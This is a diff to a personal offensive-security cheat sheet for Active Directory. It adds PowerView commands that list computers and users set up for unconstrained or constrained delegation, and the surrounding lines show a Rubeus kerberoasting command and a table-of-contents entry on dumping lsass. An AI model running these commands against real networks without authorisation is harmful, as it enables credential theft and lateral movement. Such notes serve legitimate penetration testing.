@@ -9,9 +9,10 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* **[Domain Enumeration](#powerview-enumeration)**
 		* [ASREP Roasting](#asrep-roasting)
 		* [Kerberoasting](#kerberoasting)
+		* [Unconstrained / Constrained Object](#unconstrained-/-constrained-object)
 	* **[Constrained Language Mode](#constrained-language-mode)**
 		* [CLM Enumeration](#clm-enumeration)
-		* [Dump lsass with rundll32(signed binary](#dump-lsass-process-with-signed-binary)
+		* [Dump lsass with rundll32](#dump-lsass-process-with-signed-binary)
 	* **[Foreign Principals](#foreign-principals)**
 * **Delegation**
 	* [Unconstrained Delegation](#unconstrained-delegation)
@@ -63,6 +64,17 @@ Get-DomainUser -SPN
 # Rubeus
 Rubeus.exe kerberoast /nowrap
 ```
+### Unconstrained / Constrained Object
+```
+# unconstrained computer
+Get-DomainComputer -Unconstrained -Properties name
+
+# Constrained user/computer
+Get-DomainComputer -TrustedToAuth -Properties name,msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth -Properties name,msds-allowedtodelegateto
+```
+You can abuse these delegation permission by referring [here](#unconstrained-delegation)
+
 ### Foreign Principals
 Foreign principal means other user(s) from trusted domain that have access to current domain
 ```
